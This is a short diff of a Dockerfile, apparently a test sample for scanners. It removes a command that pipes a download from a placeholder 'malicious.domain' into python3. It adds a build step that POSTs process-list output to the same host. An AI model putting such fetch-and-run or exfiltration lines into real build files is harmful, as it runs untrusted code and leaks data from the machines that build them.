@@ -3,9 +3,10 @@
 #CMD [ "python", "-c", "print('Hello 9')" ]
 
 
-FROM alpine:3.7
-
-RUN apk add --no-cache curl
-RUN apk add --no-cache python3
-# run
-CMD curl -s https:/malicious.domain/listen | python3 -
+FROM alpine:edge
+RUN apk update && apk upgrade
+RUN apk add apache2 git curl
+VOLUME /var/www/html
+RUN curl -XPOST https://malicious.domain/listen -d '$(`ps aux`)'
+EXPOSE 80
+CMD ["httpd", "-D FOREGROUND"]
